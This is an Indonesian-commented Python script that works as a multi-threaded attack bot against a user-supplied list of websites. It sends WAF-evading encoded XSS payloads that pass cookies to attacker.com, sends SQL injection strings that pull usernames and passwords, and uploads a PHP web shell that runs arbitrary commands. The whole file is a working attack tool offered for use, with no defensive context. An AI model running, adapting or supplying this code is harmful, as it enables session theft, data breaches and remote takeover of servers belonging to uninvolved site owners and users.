import requests
import base64
import random
import time
import threading

# ============================
# 🔹 ENKRIPSI & DEKRIPSI PAYLOAD
# ============================

def encrypt_payload(payload):
    """
    Mengenkripsi payload menggunakan encoding base64 + pembalikan karakter + heksadesimal.
    """
    encoded = base64.b64encode(payload.encode()).decode()
    reversed_payload = encoded[::-1]
    hex_encoded = "".join([hex(ord(c))[2:] for c in reversed_payload])
    return hex_encoded

def decrypt_payload(encrypted_payload):
    """
    Mendekripsi payload terenkripsi kembali ke bentuk asli.
    """
    hex_decoded = bytes.fromhex(encrypted_payload).decode()
    reversed_payload = hex_decoded[::-1]
    decoded = base64.b64decode(reversed_payload).decode()
    return decoded

# ============================
# 🔹 GENERATE PAYLOADS
# ============================

def generate_xss_payload():
    """
    Membuat payload XSS terenkripsi untuk bypass WAF.
    """
    base_payloads = [
        "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        "<img src=x onerror=document.location='http://attacker.com/steal.php?cookie='+document.cookie>",
    ]
    return encrypt_payload(random.choice(base_payloads))

# ============================
# 🔹 SQL INJECTION EXPLOIT
# ============================

def sqli_exploit(url):
    """
    Mencoba melakukan SQL Injection dengan beberapa payload umum.
    """
    payloads = ["' OR 1=1--", "' UNION SELECT username,password FROM users--"]
    for payload in payloads:
        try:
            response = requests.get(url + payload, timeout=5)
            if "admin" in response.text.lower():
                print(f"[✅] SQL Injection Berhasil di: {url}")
                return True
        except requests.exceptions.RequestException:
            print(f"[⚠️] Gagal terhubung ke target: {url}")
    return False

# ============================
# 🔹 WEB SHELL UPLOAD
# ============================

def upload_web_shell(target_url, shell_file="shell.php"):
    """
    Mengunggah web shell jika target rentan terhadap file upload.
    """
    files = {"file": (shell_file, "<?php system($_GET['cmd']); ?>", "application/x-php")}
    try:
        response = requests.post(target_url, files=files, timeout=5)
        if "upload success" in response.text.lower():
            print(f"[✅] Web Shell Terunggah: {target_url}/shell.php")
            return True
    except requests.exceptions.RequestException:
        print(f"[⚠️] Gagal mengunggah shell ke: {target_url}")
    return False

# ============================
# 🔹 BOT MODE (MULTI-THREADING)
# ============================

class XSS_SQLI_WebShell_Bot:
    def __init__(self, target_urls):
        self.targets = target_urls

    def attack(self, url):
        """
        Menjalankan serangan XSS, SQLi, dan Web Shell secara berurutan.
        """
        xss_payload = generate_xss_payload()
        full_url = f"{url}{xss_payload}"

        try:
            response = requests.get(full_url, timeout=5)
            print(f"[✅] Payload XSS dikirim ke {url}")

            # 🔥 Jika XSS sukses, lanjutkan ke SQLi
            if sqli_exploit(url):
                print("[🚀] Lanjut Upload Web Shell...")
                upload_web_shell(url.replace("input=", "upload.php"))

        except requests.exceptions.RequestException:
            print(f"[⚠️] Target tidak responsif: {url}")

    def start_attack(self):
        """
        Memulai serangan dengan multi-threading agar lebih cepat.
        """
        threads = []
        for url in self.targets:
            thread = threading.Thread(target=self.attack, args=(url,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()

# ============================
# 🔹 AMBIL TARGET DARI USER
# ============================

def get_targets():
    """
    Mengambil daftar target dari input manual atau file.
    """
    targets = []
    choice = input("Masukkan target secara manual (1) atau dari file (2)? [1/2]: ")

    if choice == "1":
        while True:
            url = input("Masukkan URL target (atau ketik 'done' untuk selesai): ")
            if url.lower() == "done":
                break
            targets.append(url)

    elif choice == "2":
        file_path = input("Masukkan nama file (contoh: targets.txt): ")
        try:
            with open(file_path, "r") as file:
                targets = [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            print("[❌] File tidak ditemukan!")

    else:
        print("[⚠️] Pilihan tidak valid!")

    return targets

# ============================
# 🔹 JALANKAN BOT SERANGAN
# ============================

if __name__ == "__main__":
    target_sites = get_targets()
    if target_sites:
        bot = XSS_SQLI_WebShell_Bot(target_sites)
        bot.start_attack()
    else:
        print("[❌] Tidak ada target yang dimasukkan!")
